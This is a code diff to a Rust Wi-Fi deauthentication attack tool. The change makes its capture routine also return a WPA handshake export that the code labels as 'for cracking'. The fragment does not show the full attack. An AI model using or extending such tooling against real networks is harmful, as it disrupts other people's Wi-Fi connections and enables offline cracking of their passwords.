@@ -231,7 +231,7 @@ impl DeauthAttacker {
         bssid: MacAddress,
         client: Option<MacAddress>,
         config: DeauthConfig,
-    ) -> Result<(DeauthStats, Vec<CapturedPacket>)> {
+    ) -> Result<(DeauthStats, Vec<CapturedPacket>, Option<HandshakeExport>)> {
         log::info!("Starting deauth attack with capture");
 
         let mut stats = DeauthStats::default();
@@ -244,6 +244,7 @@ impl DeauthAttacker {
 
         // Handshake tracker
         let mut handshake = HandshakeCapture::new(bssid, client);
+        let mut handshake_export: Option<HandshakeExport> = None;
 
         while start.elapsed() < config.duration {
             // Send deauth burst
@@ -265,10 +266,13 @@ impl DeauthAttacker {
                         if handshake.is_complete() {
                             log::info!("Handshake captured!");
                             stats.handshake_captured = true;
+                            if handshake_export.is_none() {
+                                handshake_export = handshake.export_for_cracking();
+                            }
 
                             if config.stop_on_handshake {
                                 stats.duration = start.elapsed();
-                                return Ok((stats, captured_packets));
+                                return Ok((stats, captured_packets, handshake_export));
                             }
                         }
                     }
@@ -279,7 +283,7 @@ impl DeauthAttacker {
         stats.duration = start.elapsed();
         stats.handshake_captured = handshake.is_complete();
 
-        Ok((stats, captured_packets))
+        Ok((stats, captured_packets, handshake_export))
     }
 
     /// Send a single deauth burst
